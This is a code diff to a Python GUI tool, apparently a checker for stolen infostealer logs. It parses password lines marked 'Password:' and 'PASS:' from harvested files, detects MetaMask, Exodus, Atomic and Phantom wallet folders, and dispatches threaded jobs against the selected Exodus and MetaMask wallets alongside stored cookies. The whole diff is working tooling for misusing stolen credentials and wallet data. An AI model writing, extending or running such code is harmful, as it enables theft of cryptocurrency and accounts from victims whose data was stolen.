@@ -242,6 +242,7 @@ class BotScannerToolWindow(object):
         self.listAccountRunning = []
         self.list_cookies = []
         self.list_wallets = []
+        self.listWalletRunning = []
         self.runCount = 0
         self.index = 0
         self.threadIndex = 0
@@ -309,15 +310,20 @@ class BotScannerToolWindow(object):
                                             password = str(pwdstr).replace("b'", "").replace("'", "").replace("Password:", "").replace(" ", "")
                                         else:
                                             password = f"{password}|" + str(pwdstr).replace("b'", "").replace("'", "").replace('Password:', '').replace(' ', '')
+                                    if pwdstr is not None and len(str(pwdstr)) > 0 and 'PASS:' in str(pwdstr):
+                                        if password is None or len(password) == 0:
+                                            password = str(pwdstr).replace("b'", "").replace("'", "").replace("PASS:", "").replace(" ", "")
+                                        else:
+                                            password = f"{password}|" + str(pwdstr).replace("b'", "").replace("'", "").replace('PASS:', '').replace(' ', '') 
                                 except:
                                     continue
                         except:
                             continue
             if item.is_dir():
-                isMetamask = 'metamask' in str(item).lower()
+                isMetamask = 'metamask' in str(item).rsplit('\\', 1)[-1].lower() and 'chrome' in str(item).rsplit('\\', 1)[-1].lower()
                 isAtomic = 'atomic' in str(item).lower()
                 isExodus = 'exodus' in str(item).lower()
-                isPhantom = 'phantom' in str(item).lower()            
+                isPhantom = 'phantom' in str(item).rsplit('\\', 1)[-1].lower() and 'chrome' in str(item).rsplit('\\', 1)[-1].lower()   
                 if isMetamask == False and isAtomic == False and isExodus == False and isPhantom == False:
                     self.recursiveDir(item, password if password is not None else passwordRoot)
                 else:
@@ -408,7 +414,16 @@ class BotScannerToolWindow(object):
             self.threadIndex = 0
             self.runCount = 0
             self.runningJob = True
-            print('self.index', self.index)
+            if self.run_option == 0:
+                self.listWalletRunning = []
+                if self.cb_exodus.isChecked():
+                    for wallet in self.list_wallets: 
+                        if wallet["wallet"] == "Exodus":
+                            self.listWalletRunning.append(wallet) 
+                if self.cb_metamask.isChecked():
+                    for wallet in self.list_wallets: 
+                        if wallet["wallet"] == "MetaMask":
+                            self.listWalletRunning.append(wallet) 
             self.runJob()
         else:
             for thread in self.listthread: thread.Stop()
@@ -421,14 +436,14 @@ class BotScannerToolWindow(object):
         if self.runningJob == True:
             #for wallet
             if self.run_option == 0:
-                if self.list_wallets is None or len(self.list_wallets) == 0:
+                if self.listWalletRunning is None or len(self.listWalletRunning) == 0:
                     self.Mesagebox(text="Không có dữ liệu để thực hiện !")
                     return
-                if len(self.list_wallets) > self.threadIndex:
+                if len(self.listWalletRunning) > self.threadIndex:
                     index = 0
                     for vm in self.list_wallets:
                         index += 1
-                        if self.runCount < int(self.thread_input.text())  and index > self.threadIndex and vm["wallet"] == "Exodus":
+                        if self.runCount < int(self.thread_input.text()) and index > self.threadIndex and vm["wallet"] == "Exodus":
                             print(vm["wallet"], index, self.threadIndex)
                             wallet = self.list_wallets[index - 1]
                             threadRun = self.runCount % int(self.thread_input.text())
@@ -451,7 +466,7 @@ class BotScannerToolWindow(object):
                     index = 0
                     for vm in self.list_cookies:
                         index += 1
-                        if self.runCount < int(self.thread_input.text())  and index > self.threadIndex and vm["wallet"] == "Exodus":
+                        if self.runCount < int(self.thread_input.text())  and index > self.threadIndex and vm["wallet"] == "MetaMask":
                             print(vm["wallet"], index, self.threadIndex)
                             wallet = self.list_cookies[index - 1]
                             threadRun = self.runCount % int(self.thread_input.text())
